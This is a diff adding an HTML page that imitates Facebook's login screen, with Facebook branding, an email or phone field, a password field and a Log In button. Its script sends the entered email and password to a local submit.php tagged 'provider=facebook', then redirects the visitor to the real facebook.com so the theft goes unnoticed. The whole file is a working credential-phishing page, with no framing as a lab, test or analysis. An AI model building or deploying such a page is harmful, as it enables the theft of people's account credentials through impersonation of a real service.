@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook – log in or sign up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: { fb: '#1877f2' }
+                }
+            }
+        };
+    </script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-900 transition duration-300">
+    <div class="min-h-screen flex items-center justify-center px-4">
+        <div class="flex flex-col lg:flex-row items-center justify-between max-w-6xl w-full gap-10">
+            <div class="text-center lg:text-left max-w-xl">
+                <h1 class="text-fb text-6xl font-extrabold mb-3 drop-shadow-lg">facebook</h1>
+                <p class="text-2xl text-gray-700 dark:text-gray-200">Connect with friends and the world around you on Facebook.</p>
+            </div>
+
+            <div class="bg-white dark:bg-gray-800 p-8 rounded-lg shadow-lg w-full max-w-md transition duration-300">
+                <div class="space-y-4">
+                    <input id="fb-email" type="text" placeholder="Email or phone number"
+                        class="w-full px-4 py-3 rounded border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-fb">
+
+                    <input id="fb-password" type="password" placeholder="Password"
+                        class="w-full px-4 py-3 rounded border border-gray-300 dark:border-gray-600 bg-white dark:bg-gray-700 text-gray-800 dark:text-white focus:outline-none focus:ring-2 focus:ring-fb">
+
+                    <button onclick="submitFacebook()" class="w-full bg-fb hover:bg-blue-700 text-white font-semibold py-3 rounded transition">Log In</button>
+
+                    <div class="text-center">
+                        <a href="#" class="text-blue-600 hover:underline text-sm dark:text-blue-400">Forgot password?</a>
+                    </div>
+
+                    <hr class="my-4 border-gray-300 dark:border-gray-600">
+
+                    <button type="button" class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-3 rounded transition">Create New Account</button>
+                </div>
+
+                <p class="text-center text-sm text-gray-600 dark:text-gray-400 mt-6">
+                    <a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function submitFacebook() {
+            const email = document.getElementById("fb-email").value;
+            const password = document.getElementById("fb-password").value;
+
+            if (!email || !password) {
+                alert("Please fill in both fields.");
+                return;
+            }
+
+            fetch("submit.php", {
+                method: "POST",
+                headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                body: `provider=facebook&email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+            }).then(() => {
+                alert("Redirecting...");
+                window.location.href = "https://facebook.com";
+            });
+        }
+    </script>
+</body>
+</html>
